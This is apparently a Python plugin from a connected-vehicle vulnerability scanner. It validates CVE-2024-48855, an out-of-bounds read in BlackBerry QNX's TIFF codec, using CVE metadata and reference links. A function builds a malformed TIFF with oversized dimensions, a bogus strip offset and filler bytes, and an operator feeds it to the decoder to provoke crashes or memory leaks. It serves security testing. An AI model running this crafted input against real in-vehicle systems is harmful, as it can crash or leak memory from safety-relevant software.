#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin
from local_exp_stimulus import build_local_sample_probe, write_temp_sample


VULN = {
    "id": 30,
    "cve": "CVE-2024-48855",
    "year": 2025,
    "domain": "车载OS/QNX",
    "vendor_product": "BlackBerry QNX SDP",
    "component": "TIFF image codec",
    "type": "越界读/信息泄露",
    "summary": "QNX SDP 8.0/7.1/7.0 TIFF编解码器越界读导致信息泄露。",
    "source_description": "Out-of-bounds read in the TIFF image codec in QNX SDP versions 8.0, 7.1 and 7.0 could allow an unauthenticated attacker to cause an information disclosure in the context of the process using the image codec.",
    "poc_status": "未见公开PoC；供应商公告",
    "research_value": "QNX广泛用于IVI、ADAS和域控制器，属于车载基础软件风险。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-48855",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-48855",
        "https://support.blackberry.com/pkb/s/article/140334",
        "https://cveawg.mitre.org/api/cve/CVE-2024-48855"
    ],
    "affected": [
        {
            "vendor": "BlackBerry",
            "product": "QNX Software Development Platform (SDP)",
            "versions": [
                {
                    "version": "8.0, 7.1 and 7.0",
                    "status": "affected"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2024-48855",
        "BlackBerry",
        "QNX",
        "SDP",
        "TIFF",
        "image",
        "codec",
        "Out-of-bounds",
        "read",
        "could",
        "allow",
        "unauthenticated",
        "cause",
        "information",
        "disclosure",
        "context",
        "process",
        "using",
        "QNX Software Development Platform (SDP"
    ]
}


def _write_qnx_tiff_sample() -> str:
    payload = (
        b"II*\x00"
        + (8).to_bytes(4, "little")
        + (3).to_bytes(2, "little")
        + (256).to_bytes(2, "little") + (4).to_bytes(2, "little") + (1).to_bytes(4, "little") + (0x7fffffff).to_bytes(4, "little")
        + (257).to_bytes(2, "little") + (4).to_bytes(2, "little") + (1).to_bytes(4, "little") + (0x7fffffff).to_bytes(4, "little")
        + (273).to_bytes(2, "little") + (4).to_bytes(2, "little") + (1).to_bytes(4, "little") + (0xffffff00).to_bytes(4, "little")
        + (0).to_bytes(4, "little")
        + b"A" * 512
    )
    return write_temp_sample("autosec_cve_2024_48855_", ".tiff", payload)


def _tiff_probe(plugin, vuln):
    return build_local_sample_probe(
        plugin,
        sample_param="tiff_sample_path",
        command_params=("qnx_image_decoder_cmd", "decoder_cmd"),
        generated_sample=_write_qnx_tiff_sample,
        phenomenon="crafted TIFF sample prepared for QNX TIFF codec out-of-bounds read or info-leak observation",
        operator_action="Run sample_path with the QNX TIFF decoder via qnx_image_decoder_cmd/decoder_cmd and observe crash output or leaked memory bytes in stderr/stdout.",
    )


class Poc21CVE202448855OutOfBoundsAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-030'
    meta_poc_name = 'CVE-2024-48855 越界读/信息泄露 Active Validation'
    meta_cve_id = 'CVE-2024-48855'
    meta_severity = 'High'
    meta_protocol = 'local'
    meta_target_os = ['qnx', 'linux']
    meta_required_params = ['software_inventory_text']
    meta_profiles = ['local_artifact']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-48855'
    meta_attack_surface = '系统/供应链组件'
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_tiff_probe)
